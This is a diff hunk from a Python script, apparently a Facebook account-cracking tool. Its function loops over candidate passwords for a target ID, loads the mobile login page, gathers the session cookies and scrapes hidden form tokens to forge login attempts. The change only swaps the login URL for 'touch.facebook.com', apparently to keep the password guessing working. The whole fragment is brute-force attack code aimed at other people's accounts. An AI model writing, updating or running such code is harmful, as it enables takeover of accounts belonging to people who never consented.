@@ -415,7 +415,7 @@ def randm(ids,psd,tl):
     try:
         for pas in psd:
             pas = rmpassconf(ids,pas)
-            requ = ses.get('https://x.prod.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
+            requ = ses.get('https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
             kueh = (f'{";".join([ "%s=%s"%(keys, value) for keys, value in ses.cookies.get_dict().items() ])}')
             data = {
             'm_ts':re.search('name="m_ts" value="(.*?)"',str(requ)).group(1),
